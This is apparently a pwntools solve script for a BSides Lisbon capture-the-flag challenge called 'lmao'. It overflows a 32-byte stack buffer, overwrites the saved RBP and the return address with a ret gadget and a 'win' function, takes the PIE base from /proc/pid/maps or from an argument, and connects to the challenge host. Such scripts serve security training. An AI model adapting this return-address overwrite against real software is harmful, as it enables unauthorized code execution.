#!/usr/bin/env python3

from pwn import *

# Set up pwntools
context.update(arch='amd64', os='linux', log_level='debug')

# Load the binary
exe = ELF('./dist/src/lmao')

def exploit(target, base=None):
    # Receive the "I say: AYY" message
    target.recvuntil(b"You say: ")
    
    # Build the payload
    # Buffer is 0x20 (32 bytes)
    # Stack layout: [buffer (32 bytes)][saved rbp (8 bytes)][return address (8 bytes)]
    
    payload = b"LMAO"  # Need this to pass the strncmp check
    payload += b"A" * (32 - 4)  # Fill the rest of the buffer
    payload += b"B" * 8  # Overwrite saved RBP
    
    # Full address overwrite
    # Get the base address from procfs (only works locally)
    if isinstance(target, process):
        # Read the base address from /proc/pid/maps
        maps = open(f'/proc/{target.pid}/maps', 'r').read()
        base = int(maps.split('\n')[0].split('-')[0], 16)
        ret_gadget = base + 0x1016  # ret gadget for stack alignment
        win_addr = base + 0x11a9
        log.success(f"Base address: {hex(base)}")
        log.success(f"Win address: {hex(win_addr)}")
        log.success(f"Ret gadget: {hex(ret_gadget)}")
        
        # Add ret gadget for stack alignment (Ubuntu 24.04 requirement)
        payload += p64(ret_gadget)
        payload += p64(win_addr)
    else:
        # For remote with known base
        if base:
            ret_gadget = base + 0x1016
            win_addr = base + 0x11a9
            log.info(f"Using base: {hex(base)}")
            log.info(f"Win address: {hex(win_addr)}")
            payload += p64(ret_gadget)
            payload += p64(win_addr)
        else:
            # Try without base (won't work with PIE)
            win_addr = exe.sym['win']
            log.info(f"Using symbol address: {hex(win_addr)}")
            payload += p64(win_addr)
    
    # Send the payload
    target.sendline(payload)
    
    # Interactive shell
    target.interactive()

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        # Remote connection with base address
        if len(sys.argv) < 3:
            print("Usage for remote: python3 solve.py remote [base_address_hex]")
            print("If no base provided, will try common addresses")
            sys.exit(1)
        
        host = "7b44d3bf-0008-4576-b715-b08d8cb090b7-lmao.challs.bsideslisbon.org"
        port = 20298
        target = remote(host, port)
        
        if len(sys.argv) > 2:
            base = int(sys.argv[2], 16)
            exploit(target, base=base)
        else:
            # Try common base
            exploit(target, base=0x555555554000)
    else:
        # Local connection
        binary_path = "./dist/src/lmao"
        target = process(binary_path)
    
        exploit(target)
